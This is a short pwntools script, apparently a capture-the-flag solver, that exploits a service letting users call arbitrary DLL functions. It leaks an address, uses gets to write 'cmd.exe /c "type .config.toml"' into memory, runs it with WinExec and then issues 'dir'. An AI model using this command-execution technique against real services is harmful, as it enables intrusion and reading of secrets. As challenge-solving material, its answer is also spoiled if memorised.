from pwn import *
import time

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, PORT)

p.recvuntil(b'load?')
p.sendline(b'msvcrt.dll')
x = p.recvuntil(b'call')

x = x.split(b'\nWhat function')[-2].split(b' ')[-1]
print(x)

x = int(x.strip(), 16)
print(hex(x))

data = x + 0x70000

p.sendline(b'gets')
p.recvuntil(b'argument')
p.sendline(str(data).encode())
p.recvuntil(b'calling')
p.sendline(b'C:\\Windows\\System32\\cmd.exe /c "type .config.toml"')

print(p.recvuntil(b'load?'))
# 1/0
p.sendline(b'kernel32.dll')
x = p.recvuntil(b'call')
print(x)
p.sendline(b'WinExec')
print(p.recvuntil(b'argument'))
p.sendline(str(data).encode())

# print(p.recvuntil(b'}'))


print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
# time.sleep(2)
p.sendline(b'dir\r\n')
print(p.recv(4096), flush=True)
# time.sleep(1)
# p.sendline(b'.\\submitter.exe')
# while True:
#     print(p.recvline())

